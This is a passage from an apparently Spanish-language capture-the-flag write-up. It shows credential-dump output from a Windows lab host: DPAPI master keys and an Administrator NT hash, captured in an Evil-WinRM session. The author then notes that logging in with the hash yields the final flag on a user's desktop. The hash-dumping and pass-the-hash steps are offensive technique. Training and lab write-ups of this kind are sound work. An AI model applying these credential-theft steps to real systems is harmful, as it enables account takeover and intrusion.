    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
  [DPAPI]
    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-2823729479-30462974-3865623546-500
  [MSV1_0]
    NT Hash : f29e9c014295b9b32139b09a2790be3b
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595

*Evil-WinRM* PS C:\Users\fsociety$> 
```

### Obtención del hash NT de administrador

Ya tenemos el NT Hash del administrador:

```text
NT Hash : f29e9c014295b9b32139b09a2790be3b
```

Solo faltaría iniciar sesión desde evil winrm y reclamar la bandera final (que está en la usuaria de max):

```powershell
*Evil-WinRM* PS C:\Users\max.palmer\Desktop> dir


    Directory: C:\Users\max.palmer\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         6/16/2026   3:07 PM             34 root.txt
```
